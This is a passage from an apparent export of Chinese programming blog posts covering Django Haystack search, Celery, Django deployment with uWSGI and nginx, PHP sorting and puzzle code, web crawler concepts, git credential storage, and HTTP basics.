self.get_model().objects.all()\n</code></pre>\n\n<p>5.在目录“templates/search/indexes/应用名称/”下创建“模型类名称_text.txt”文件</p>\n\n<pre class=\"has\">\n<code>#goodsinfo_text.txt，这里列出了要对哪些列的内容进行检索\n{{ object.gName }}\n{{ object.gSubName }}\n{{ object.gDes }}\n</code></pre>\n\n<p>6.在目录“templates/search/”下建立search.html</p>\n\n<pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n{% if query %}\n    &lt;h3&gt;搜索结果如下：&lt;/h3&gt;\n    {% for result in page.object_list %}\n        &lt;a href=\"/{{ result.object.id }}/\"&gt;{{ result.object.gName }}&lt;/a&gt;&lt;br/&gt;\n    {% empty %}\n        &lt;p&gt;啥也没找到&lt;/p&gt;\n    {% endfor %}\n\n    {% if page.has_previous or page.has_next %}\n        &lt;div&gt;\n            {% if page.has_previous %}&lt;a href=\"?q={{ query }}&amp;amp;page={{ page.previous_page_number }}\"&gt;{% endif %}&amp;laquo; 上一页{% if page.has_previous %}&lt;/a&gt;{% endif %}\n        |\n            {% if page.has_next %}&lt;a href=\"?q={{ query }}&amp;amp;page={{ page.next_page_number }}\"&gt;{% endif %}下一页 &amp;raquo;{% if page.has_next %}&lt;/a&gt;{% endif %}\n        &lt;/div&gt;\n    {% endif %}\n{% endif %}\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>7.建立ChineseAnalyzer.py文件</p>\n\n<ul><li>保存在haystack的安装文件夹下，路径如“/home/python/.virtualenvs/django_py2/lib/python2.7/site-packages/haystack/backends”</li>\n</ul><pre class=\"has\">\n<code>import jieba\nfrom whoosh.analysis import Tokenizer, Token\n\n\nclass ChineseTokenizer(Tokenizer):\n    def __call__(self, value, positions=False, chars=False,\n                 keeporiginal=False, removestops=True,\n                 start_pos=0, start_char=0, mode='', **kwargs):\n        t = Token(positions, chars, removestops=removestops, mode=mode,\n                  **kwargs)\n        seglist = jieba.cut(value, cut_all=True)\n        for w in seglist:\n            t.original = t.text = w\n            t.boost = 1.0\n            if positions:\n                t.pos = start_pos + value.find(w)\n            if chars:\n                t.startchar = start_char + value.find(w)\n                t.endchar = start_char + value.find(w) + len(w)\n            yield t\n\n\ndef ChineseAnalyzer():\n    return ChineseTokenizer()\n</code></pre>\n\n<p>8.复制whoosh_backend.py文件，改名为whoosh_cn_backend.py</p>\n\n<ul><li>注意：复制出来的文件名，末尾会有一个空格，记得要删除这个空格</li>\n</ul><pre class=\"has\">\n<code>from .ChineseAnalyzer import ChineseAnalyzer \n查找\nanalyzer=StemmingAnalyzer()\n改为\nanalyzer=ChineseAnalyzer()\n</code></pre>\n\n<p>9.生成索引</p>\n\n<ul><li>初始化索引数据</li>\n</ul><pre class=\"has\">\n<code>python manage.py rebuild_index\n</code></pre>\n\n<p>10.在模板中创建搜索栏</p>\n\n<pre class=\"has\">\n<code>&lt;form method='get' action=\"/search/\" target=\"_blank\"&gt;\n    &lt;input type=\"text\" name=\"q\"&gt;\n    &lt;input type=\"submit\" value=\"查询\"&gt;\n&lt;/form&gt;</code></pre>\n                                    </div>", "log_PostTime": 1584891175, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django celery6.4", "log_Intro": "Django celery6.4", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"celery\">celery</h1>\n\n<ul><li><a href=\"http://www.celeryproject.org/\" rel=\"nofollow\">官方网站</a></li>\n\t<li><a href=\"http://docs.jinkan.org/docs/celery/\" rel=\"nofollow\">中文文档</a></li>\n\t<li>示例一：用户发起request，并等待response返回。在本些views中，可能需要执行一段耗时的程序，那么用户就会等待很长时间，造成不好的用户体验</li>\n\t<li>示例二：网站每小时需要同步一次天气预报信息，但是http是请求触发的，难道要一小时请求一次吗？</li>\n\t<li>使用celery后，情况就不一样了</li>\n\t<li>示例一的解决：将耗时的程序放到celery中执行</li>\n\t<li>示例二的解决：使用celery定时执行</li>\n</ul><p>名词</p>\n\n<ul><li>任务task：就是一个Python函数</li>\n\t<li>队列queue：将需要执行的任务加入到队列中</li>\n\t<li>工人worker：在一个新进程中，负责执行队列中的任务</li>\n\t<li>代理人broker：负责调度，在布置环境中使用redis</li>\n</ul><p>使用</p>\n\n<ul><li>安装包</li>\n</ul><pre class=\"has\">\n<code>celery==3.1.25\ncelery-with-redis==3.0\ndjango-celery==3.1.17\n</code></pre>\n\n<ul><li>配置settings</li>\n</ul><pre class=\"has\">\n<code>INSTALLED_APPS = (\n  ...\n  'djcelery',\n}\n\n...\n\nimport djcelery\ndjcelery.setup_loader()\nBROKER_URL = 'redis://127.0.0.1:6379/0'\nCELERY_IMPORTS = ('应用名称.task')\n</code></pre>\n\n<ul><li>在应用目录下创建task.py文件</li>\n</ul><pre class=\"has\">\n<code>import time\nfrom celery import task\n\n@task\ndef sayhello():\n    print('hello ...')\n    time.sleep(2)\n    print('world ...')\n</code></pre>\n\n<ul><li>迁移，生成celery需要的数据表</li>\n</ul><pre class=\"has\">\n<code>python manage.py migrate\n</code></pre>\n\n<ul><li>启动Redis</li>\n</ul><pre class=\"has\">\n<code>sudo redis-server /etc/redis/redis.conf\n</code></pre>\n\n<ul><li>启动worker</li>\n</ul><pre class=\"has\">\n<code>python manage.py celery worker --loglevel=info\n</code></pre>\n\n<ul><li>调用语法</li>\n</ul><pre class=\"has\">\n<code>function.delay(parameters)\n</code></pre>\n\n<ul><li>使用代码</li>\n</ul><pre class=\"has\">\n<code>#from task import *\n\ndef sayhello(request):\n    print('hello ...')\n    import time\n    time.sleep(10)\n    print('world ...')\n\n    # sayhello.delay()\n\n    return HttpResponse(\"hello world\")</code></pre>\n                                    </div>", "log_PostTime": 1584891177, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PHP 算法题：有多少苹果用来分赃1.1", "log_Intro": "PHP 算法题：有多少苹果用来分赃1.1", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>题目描述：</h3>\n\n<p>          有5个人偷了一堆苹果，他们准备在第二天进行分赃。晚上，有一个溜出来，他把所有苹果分成了5份，但是多了一个，他顺手把这多了一个，他顺手把多的一个苹果扔给树上的猴子，自己先拿1/5藏了起来。没想到其他四人也是这么想的，都如第一个人一样把苹果分成5份，把多的那一个扔给了树上的猴，偷走了1/5。第二天，大家分赃，也是分成5份多一个扔给猴子。最后一人分了一份。问：共有多少苹果？</p>\n\n<h3>解答：</h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n    for ($s = 5; ; $s++) {\n        if ($s%5 == 1) {\n            // 第一个人分苹果,可以分了5份还剩1个\n            $l = $s - round($s/5) - 1;\n            if ($l%5 == 1) {\n                // 第二个人分苹果,可以分了5份还剩1个\n                $m = $l - round($l/5) - 1;\n                if ($m%5 == 1) {\n                    // 第三个人分苹果,可以分了5份还剩1个\n                    $n = $m - round($m/5) - 1;\n                    if ($n%5 == 1) {\n                       // 第四个人分苹果,可以分了5份还剩1个\n                       $o = $n - round($n/5) - 1;\n                        if ($o%5 == 1) {\n                            // 第五个人分苹果,可以分了5份还剩1个\n                            $p = $o - round($o/5) - 1;\n                            if ($p%5 == 1) {\n                                echo '苹果总数符合5次分苹果都剩一个最小值:'.$s;\n                                exit();\n                            }\n                        }\n                    }\n                }\n            }\n        }\n\t\tif ($s &gt; 20000) {\n\t\t\techo $s;\n\t\t\tbreak;\n\t\t}\n    }    \n?&gt;</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891178, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PHP算法题：如何实现冒泡排序", "log_Intro": "PHP算法题：如何实现冒泡排序", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>算法原理：</h3>\n\n<p>1.比较相邻的元素，如果第一个比第二个大，那么就交换这两个元素。</p>\n\n<p>2.对每一对相邻元素做同样的工作，从第一对开始到最后一对结束，最后的元素应该会是最大的数。</p>\n\n<p>3.除了最后一个元素外，针对其他的元素重复以上步骤。</p>\n\n<p>4.对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较为止。</p>\n\n<h3>实现代码：</h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n    header(\"Content-type:text/html;charset=utf-8\");\n    // 性能最差的冒泡排序方法\n    function maopao1($arr) {\n    $len = count($arr);  //计算数字长度\n        for ($i = 1; $i &lt; $len; $i++) {\n          // 该层循环控制需要冒泡的轮数\n            for ($k = 0; $k &lt; $len -$i; $k++) {\n                if ($arr[$k] &gt; $arr[$k+1]) {\n                    $tmp = $arr[$k];\n                    $arr[$k] = $arr[$k+1];\n                    $arr[$k+1] = $tmp;\n                }\n            }\n        }\n        return $arr;\n    }\n\n    // 性能最好的冒泡排序方法\n    function maopao2($arr) {\n        // 设置变量的初始值\n        $low = 0;\n        $high = count($arr) -1;\n        while ($low &lt; $high) {\n            // 正向冒泡,找到最大值\n            for ($j = $low; $j &lt; $high; ++$j) {\n                if ($arr[$j] &gt; $arr[$j+1]) {\n                    $tmp = $arr[$j];\n                    $arr[$j] = $arr[$j+1];\n                    $arr[$j+1] = $tmp;\n                }\n            }\n            --$high;\n            // 放向冒泡,找到最小值\n            for ($j = $high; $j &gt; $low; --$j) {\n                if ($arr[$j] &lt; $arr[$j-1]) {\n                    $tmp = $arr[$j];\n                    $arr[$j] = $arr[$j-1];\n                    $arr[$j-1] = $tmp;\n                }\n            }\n            ++$low;\n        }\n        return $arr;\n    }\n\n    $arr = array(121,656,8997,11,56456,778,65454,314354,1121);\n    echo \"排序前:\";\n    foreach ($arr as $k =&gt; $val) {\n        echo $val.' ';\n    }\n    echo \"&lt;br&gt;方法一排序后:\";\n    $arr = maopao1($arr);\n    foreach ($arr as $k =&gt; $val) {\n        echo $val.' ';\n\n    }\n    echo \"&lt;br&gt;方法二排序后:\";\n    $arr = maopao2($arr);\n    foreach ($arr as $k =&gt; $val) {\n        echo $val.' ';\n\n    }\n?&gt;</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891180, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 布署6.5", "log_Intro": "Django 布署6.5", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"布署\" style=\"margin-left:0px;\"><strong><span style=\"color:#333333;\">布署</span></strong></h1>\n\n<ul style=\"margin-left:0px;\"><li>从uwsgi、nginx、静态文件三个方面处理</li>\n</ul><p><strong><span style=\"color:#333333;\">服务器介绍</span></strong></p>\n\n<ul style=\"margin-left:0px;\"><li>服务器：私有服务器、公有服务器</li>\n\t<li>私有服务器：公司自己购买、自己维护，只布署自己的应用，可供公司内部或外网访问</li>\n\t<li>公有服务器：集成好运营环境，销售空间或主机，供其布署自己的应用</li>\n\t<li>私有服务器成本高，需要专业人员维护，适合大公司使用</li>\n\t<li>公有服务器适合初创公司使用，成本低</li>\n\t<li>常用的公有服务器，如阿里云、青云等，可根据需要，按流量收费或按时间收费</li>\n\t<li>此处的服务器是物理上的一台非常高、线路全、运行稳定的机器</li>\n</ul><p><strong><span style=\"color:#333333;\">服务器环境配置</span></strong></p>\n\n<ul style=\"margin-left:0px;\"><li>在本地的虚拟环境中，项目根目录下，执行命令收集所有包</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>pip freeze &gt; plist.txt\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>通过ftp软件将开发好的项目上传到此服务器的某个目录</li>\n\t<li>安装并创建虚拟环境，如果已有则跳过此步</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>sudo apt-get install python-virtualenv\nsudo easy_install virtualenvwrapper\nmkvirtualenv [虚拟环境名称]\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>在虚拟环境上工作，安装所有需要的包</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>workon [虚拟环境名称]\npip install -r plist.txt\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>更改settings.py文件</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>DEBUG = False\nALLOW_HOSTS=['*',]表示可以访问服务器的ip\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>启动服务器，运行正常，但是静态文件无法加载</li>\n</ul><p><strong><span style=\"color:#333333;\">WSGI</span></strong></p>\n\n<ul style=\"margin-left:0px;\"><li>python manage.py runserver：这是一款适合开发阶段使用的服务器，不适合运行在真实的生产环境中</li>\n\t<li>在生产环境中使用WSGI</li>\n\t<li>WSGI：Web服务器网关接口，英文为Python Web Server Gateway Interface，缩写为WSGI，是Python应用程序或框架和Web服务器之间的一种接口，被广泛接受</li>\n\t<li>WSGI没有官方的实现, 因为WSGI更像一个协议，只要遵照这些协议,WSGI应用(Application)都可以在任何服务器(Server)上运行</li>\n\t<li>命令django-admin startproject会生成一个简单的wsgi.py文件，确定了settings、application对象\n\t<ul style=\"margin-left:0px;\"><li>application对象：在Python模块中使用application对象与应用服务器交互</li>\n\t\t<li>settings模块：Django需要导入settings模块，这里是应用定义的地方</li>\n\t</ul></li>\n\t<li>此处的服务器是一个软件，可以监听网卡端口、遵从网络层传输协议，收发http协议级别的数据</li>\n</ul><p><strong><span style=\"color:#333333;\">uWSGI</span></strong></p>\n\n<ul style=\"margin-left:0px;\"><li>uWSGI实现了WSGI的所有接口，是一个快速、自我修复、开发人员和系统管理员友好的服务器</li>\n\t<li>uWSGI代码完全用C编写</li>\n\t<li>安装uWSGI</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>pip install uwsgi\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>配置uWSGI，在项目中新建文件uwsgi.ini，编写如下配置</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>[uwsgi]\nsocket=外网ip:端口（使用nginx连接时，使用socket）\nhttp=外网ip:端口（直接做web服务器，使用http）\nchdir=项目根目录\nwsgi-file=项目中wsgi.py文件的目录，相对于项目根目录\nprocesses=4\nthreads=2\nmaster=True\npidfile=uwsgi.pid\ndaemonize=uswgi.log\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>启动：uwsgi --ini uwsgi.ini</li>\n\t<li>停止：uwsgi --stop uwsgi.pid</li>\n\t<li>重启：uwsgi --reload uwsgi.pid</li>\n\t<li>使用http协议查看网站运行情况，运行正常，但是静态文件无法加载</li>\n</ul><p><strong><span style=\"color:#333333;\">nginx</span></strong></p>\n\n<ul style=\"margin-left:0px;\"><li>使用nginx的作用\n\t<ul style=\"margin-left:0px;\"><li>负载均衡：多台服务器轮流处理请求</li>\n\t\t<li>反射代理：隐藏真实服务器</li>\n\t</ul></li>\n\t<li>实现构架：客户端请求nginx，再由nginx请求uwsgi，运行django框架下的python代码</li>\n\t<li>nginx+uwsgi也可以用于其它框架的python web代码，不限于django</li>\n\t<li>到官网下载nginx压缩文件或通过命令安装</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>sudo apt-get nginx\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>这里以下载压缩文件为例演示</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>解压缩：\ntar zxvf nginx-1.6.3.tar.gz\n\n进入nginx-1.6.3目录依次执行如下命令进行安装：\n./configure\nmake\nsudo make install\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>默认安装到/usr/local/nginx目录，进入此目录执行命令</li>\n\t<li>查看版本：sudo sbin/nginx -v</li>\n\t<li>启动：sudo sbin/nginx</li>\n\t<li>停止：sudo sbin/nginx -s stop</li>\n\t<li>重启：sudo sbin/nginx -s reload</li>\n\t<li>通过浏览器查看nginx运行结果</li>\n\t<li>指向uwsgi项目：编辑conf/nginx.conf文件</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>sudo conf/nginx.conf\n\n在server下添加新的location项，指向uwsgi的ip与端口\nlocation / {\n    include uwsgi_params;将所有的参数转到uwsgi下\n    uwsgi_pass uwsgi的ip与端口;\n}\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li><span style=\"color:#FF0000;\">修改uwsgi.ini文件，启动socket，禁用http</span></li>\n\t<li>重启nginx、uwsgi</li>\n\t<li>在浏览器中查看项目，发现静态文件加载不正常，接下来解决静态文件的问题</li>\n</ul><p><strong><span style=\"color:#333333;\">静态文件</span></strong></p>\n\n<ul style=\"margin-left:0px;\"><li>静态文件一直都找不到，现在终于可以解决了</li>\n\t<li>所有的静态文件都会由nginx处理，不会将请求转到uwsgi</li>\n\t<li>配置nginx的静态项，打开conf/nginx.conf文件，找到server，添加新location</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>location /static {\n    alias /var/www/test5/static/;\n}\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>在服务器上创建目录结构“/var/www/test5/”</li>\n\t<li>修改目录权限</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>sudo chmod 777 /var/www/test5\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>创建static目录，注意顺序是先分配权限，再创建目录</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>mkdir static\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>最终目录结构如下图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"82\" src=\"https://img-blog.csdnimg.cn/20191022234732102.png\" width=\"328\"></p>\n\n<p> </p>\n\n<ul style=\"margin-left:0px;\"><li>修改settings.py文件</li>\n</ul><pre style=\"margin-left:0px;\">\n<span style=\"color:#333333;\"><code>STATIC_ROOT='/var/www/test5/static/'\nSTATIC_URL='/static/'\n</code></span></pre>\n\n<ul style=\"margin-left:0px;\"><li>收集所有静态文件到static_root指定目录：python manage.py collectstatic</li>\n\t<li>重启nginx、uwsgi</li>\n</ul>                                    </div>", "log_PostTime": 1584891181, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "关于Python爬虫原理和数据抓取1.1", "log_Intro": "关于Python爬虫原理和数据抓取1.1", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"为什么要做爬虫？\">为什么要做爬虫？</h2>\n\n<p>首先请问：都说现在是\"大数据时代\"，那数据从何而来？</p>\n\n<ul><li>\n\t<p><code>企业产生的用户数据</code>：<a href=\"http://index.baidu.com\" rel=\"nofollow\">百度指数</a>、<a href=\"https://alizs.taobao.com\" rel=\"nofollow\">阿里指数</a>、<a href=\"http://tbi.tencent.com\" rel=\"nofollow\">TBI腾讯浏览指数</a>、<a href=\"http://data.weibo.com/index\" rel=\"nofollow\">新浪微博指数</a></p>\n\t</li>\n\t<li>\n\t<p><code>数据平台购买数据</code>：<a href=\"http://www.datatang.com/about/about-us.html\" rel=\"nofollow\">数据堂</a>、<a href=\"http://www.moojnn.com/data-market/\" rel=\"nofollow\">国云数据市场</a>、<a href=\"http://trade.gbdex.com/trade.web/index.jsp\" rel=\"nofollow\">贵阳大数据交易所</a></p>\n\t</li>\n\t<li>\n\t<p><code>政府/机构公开的数据</code>：<a href=\"http://data.stats.gov.cn/index.htm\" rel=\"nofollow\">中华人民共和国国家统计局数据</a>、<a href=\"http://data.worldbank.org.cn\" rel=\"nofollow\">世界银行公开数据</a>、<a href=\"http://data.un.org\" rel=\"nofollow\">联合国数据</a>、<a href=\"http://www.nasdaq.com/zh\" rel=\"nofollow\">纳斯达克</a>。</p>\n\t</li>\n\t<li>\n\t<p><code>数据管理咨询公司</code>：<a href=\"http://www.mckinsey.com.cn\" rel=\"nofollow\">麦肯锡</a>、<a href=\"https://www.accenture.com/cn-zh/\" rel=\"nofollow\">埃森哲</a>、<a href=\"http://www.iresearch.com.cn\" rel=\"nofollow\">艾瑞咨询</a></p>\n\t</li>\n\t<li>\n\t<p><code>爬取网络数据</code>：如果需要的数据市场上没有，或者不愿意购买，那么可以选择招/做一名爬虫工程师，自己动手丰衣足食。<a href=\"https://www.lagou.com/jobs/list_python%E7%88%AC%E8%99%AB\" rel=\"nofollow\">拉勾网Python爬虫职位</a></p>\n\t</li>\n</ul><h2 id=\"爬虫是什么？\">爬虫是什么？</h2>\n\n<p><a href=\"http://baike.baidu.com/link?url=3SeA6RcStie6o9T5XGMTBoHK-BGiO_0IqtnI4IkVjDBsoKrJL0aotjA4cjqbx8wF\" rel=\"nofollow\">百度百科：网络爬虫</a></p>\n\n<h2 id=\"关于python爬虫，我们需要学习的有：\">关于Python爬虫，我们需要学习的有：</h2>\n\n<p>1. Python基础语法学习（基础知识）</p>\n\n<p>2. HTML页面的内容抓取（数据抓取）</p>\n\n<p>3. HTML页面的数据提取（数据清洗）</p>\n\n<p>4. Scrapy框架以及scrapy-redis分布式策略（第三方框架）</p>\n\n<p>6. 爬虫(Spider)、反爬虫(Anti-Spider)、反反爬虫(Anti-Anti-Spider)之间的斗争....</p>\n\n<h1 id=\"通用爬虫和聚焦爬虫\">通用爬虫和聚焦爬虫</h1>\n\n<p>根据使用场景，网络爬虫可分为 <strong>通用爬虫</strong> 和 <strong>聚焦爬虫</strong> 两种.</p>\n\n<h2 id=\"通用爬虫\">通用爬虫</h2>\n\n<p>通用网络爬虫 是 捜索引擎抓取系统（Baidu、Google、Yahoo等）的重要组成部分。主要目的是将互联网上的网页下载到本地，形成一个互联网内容的镜像备份。</p>\n\n<h3 id=\"通用搜索引擎（search-engine）工作原理\">通用搜索引擎（Search Engine）工作原理</h3>\n\n<p><strong>通用网络爬虫</strong> 从互联网中搜集网页，采集信息，这些网页信息用于为搜索引擎建立索引从而提供支持，它决定着整个引擎系统的内容是否丰富，信息是否即时，因此其性能的优劣直接影响着搜索引擎的效果。</p>\n\n<p>第一步：抓取网页</p>\n\n<p>搜索引擎网络爬虫的基本工作流程如下：</p>\n\n<ol><li>\n\t<p>首先选取一部分的种子URL，将这些URL放入待抓取URL队列；</p>\n\t</li>\n\t<li>\n\t<p>取出待抓取URL，解析DNS得到主机的IP，并将URL对应的网页下载下来，存储进已下载网页库中，并且将这些URL放进已抓取URL队列。</p>\n\t</li>\n\t<li>\n\t<p>分析已抓取URL队列中的URL，分析其中的其他URL，并且将URL放入待抓取URL队列，从而进入下一个循环...</p>\n\t</li>\n</ol><p><img alt=\"\" class=\"has\" height=\"387\" src=\"https://img-blog.csdnimg.cn/20191023155837895.png\" width=\"265\"> </p>\n\n<p>搜索引擎如何获取一个新网站的URL：</p>\n\n<p>1. 新网站向搜索引擎主动提交网址：（如百度<a href=\"http://zhanzhang.baidu.com/linksubmit/url\" rel=\"nofollow\">http://zhanzhang.baidu.com/linksubmit/url</a>）</p>\n\n<p>2. 在其他网站上设置新网站外链（尽可能处于搜索引擎爬虫爬取范围）</p>\n\n<p>3. 搜索引擎和DNS解析服务商(如DNSPod等）合作，新网站域名将被迅速抓取。</p>\n\n<p>但是搜索引擎蜘蛛的爬行是被输入了一定的规则的，它需要遵从一些命令或文件的内容，如标注为<code>nofollow</code>的链接，或者是<code>Robots</code>协议。</p>\n\n<blockquote>\n<p>Robots协议（也叫爬虫协议、机器人协议等），全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，例如：</p>\n\n<p>淘宝网：<a href=\"https://www.taobao.com/robots.txt\" rel=\"nofollow\">https://www.taobao.com/robots.txt</a></p>\n\n<p>腾讯网： <a href=\"http://www.qq.com/robots.txt\" rel=\"nofollow\">http://www.qq.com/robots.txt</a></p>\n</blockquote>\n\n<p>第二步：数据存储</p>\n\n<p>搜索引擎通过爬虫爬取到的网页，将数据存入原始页面数据库。其中的页面数据与用户浏览器得到的HTML是完全一样的。</p>\n\n<p>搜索引擎蜘蛛在抓取页面时，也做一定的重复内容检测，一旦遇到访问权重很低的网站上有大量抄袭、采集或者复制的内容，很可能就不再爬行。</p>\n\n<p>第三步：预处理</p>\n\n<p>搜索引擎将爬虫抓取回来的页面，进行各种步骤的预处理。</p>\n\n<ul><li>提取文字</li>\n\t<li>中文分词</li>\n\t<li>消除噪音（比如版权声明文字、导航条、广告等……）</li>\n\t<li>索引处理</li>\n\t<li>链接关系计算</li>\n\t<li>特殊文件处理</li>\n\t<li>....</li>\n</ul><p>除了HTML文件外，搜索引擎通常还能抓取和索引以文字为基础的多种文件类型，如 PDF、Word、WPS、XLS、PPT、TXT 文件等。我们在搜索结果中也经常会看到这些文件类型。</p>\n\n<p>但搜索引擎还不能处理图片、视频、Flash 这类非文字内容，也不能执行脚本和程序。</p>\n\n<p>第四步：提供检索服务，网站排名</p>\n\n<p>搜索引擎在对信息进行组织和处理后，为用户提供关键字检索服务，将用户检索相关的信息展示给用户。</p>\n\n<p>同时会根据页面的PageRank值（链接的访问量排名）来进行网站排名，这样Rank值高的网站在搜索结果中会排名较前，当然也可以直接使用 Money 购买搜索引擎网站排名，简单粗暴。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023155904738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>课外阅读：<a href=\"http://article.yeeyan.org/view/99083/114884\" rel=\"nofollow\">Google搜索引擎的工作原理</a></p>\n\n<h3 id=\"但是，这些通用性搜索引擎也存在着一定的局限性：\">但是，这些通用性搜索引擎也存在着一定的局限性：</h3>\n\n<ol><li>\n\t<p>通用搜索引擎所返回的结果都是网页，而大多情况下，网页里90%的内容对用户来说都是无用的。</p>\n\t</li>\n\t<li>\n\t<p>不同领域、不同背景的用户往往具有不同的检索目的和需求，搜索引擎无法提供针对具体某个用户的搜索结果。</p>\n\t</li>\n\t<li>\n\t<p>万维网数据形式的丰富和网络技术的不断发展，图片、数据库、音频、视频多媒体等不同数据大量出现，通用搜索引擎对这些文件无能为力，不能很好地发现和获取。</p>\n\t</li>\n\t<li>\n\t<p>通用搜索引擎大多提供基于关键字的检索，难以支持根据语义信息提出的查询，无法准确理解用户的具体需求。</p>\n\t</li>\n</ol><h3 id=\"针对这些情况，聚焦爬虫技术得以广泛使用。\">针对这些情况，聚焦爬虫技术得以广泛使用。</h3>\n\n<h2 id=\"聚焦爬虫\">聚焦爬虫</h2>\n\n<p>聚焦爬虫，是\"面向特定主题需求\"的一种网络爬虫程序，它与通用搜索引擎爬虫的区别在于： <strong><em>聚焦爬虫在实施网页抓取时会对内容进行处理筛选，尽量保证只抓取与需求相关的网页信息。</em></strong></p>\n\n<h3 id=\"而我们今后要学习的，就是聚焦爬虫。\">而我们今后要学习的，就是聚焦爬虫。</h3>\n                                    </div>", "log_PostTime": 1584891182, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "git push 时不用每次都输入密码的方法", "log_Intro": "git push 时不用每次都输入密码的方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>在本地克隆下来的git仓库中找到 .git 目录 （.git 目录是隐藏文件夹 在组织-&gt;文件夹和搜索选项-&gt; 查看选项卡 -&gt; 隐藏文件和文件夹 -&gt; 显示隐藏的文件、文件夹和驱动器）</p>\n\n<p>进入 .git 目录 找到 config 文件打开，添加   </p>\n\n<p>　　</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>[user]</code></p>\n\n\t\t\t<p><code>    </code><code>name = 你的用户名</code></p>\n\n\t\t\t<p><code>    </code><code>email = 你的邮箱</code></p>\n\n\t\t\t<p><code>[credential]</code></p>\n\n\t\t\t<p><code>    </code><code>helper = store</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>　　</p>\n\n<p>保存后 push 一次，下次就不需要输入密码了</p>\n                                    </div>", "log_PostTime": 1584891182, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "HTTP/HTTPS的请求和响应", "log_Intro": "HTTP/HTTPS的请求和响应", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"http和https\">HTTP和HTTPS</h1>\n\n<p>HTTP协议（HyperText Transfer Protocol，超文本传输协议）：是一种发布和接收 HTML页面的方法。</p>\n\n<p>HTTPS（Hypertext Transfer Protocol over Secure Socket Layer）简单讲是HTTP的安全版，在HTTP下加入SSL层。</p>\n\n<p>SSL（Secure Sockets Layer 安全套接层）主要用于Web的安全传输协议，在传输层对网络连接进行加密，保障在Internet上数据传输的安全。</p>\n\n<ul><li><code>HTTP</code>的端口号为<code>80</code>，</li>\n\t<li><code>HTTPS</code>的端口号为<code>443</code></li>\n</ul><p>HTTP工作原理</p>\n\n<p>网络爬虫抓取过程可以理解为<code>模拟浏览器操作的过程</code>。</p>\n\n<p>浏览器的主要功能是向服务器发出请求，在浏览器窗口中展示您选择的网络资源，HTTP是一套计算机通过网络进行通信的规则。</p>\n\n<h1 id=\"http的请求与响应\">HTTP的请求与响应</h1>\n\n<p>HTTP通信由两部分组成： <strong>客户端请求消息</strong> 与 <strong>服务器响应消息</strong></p>\n\n<p><strong><img alt=\"\" class=\"has\" height=\"181\" 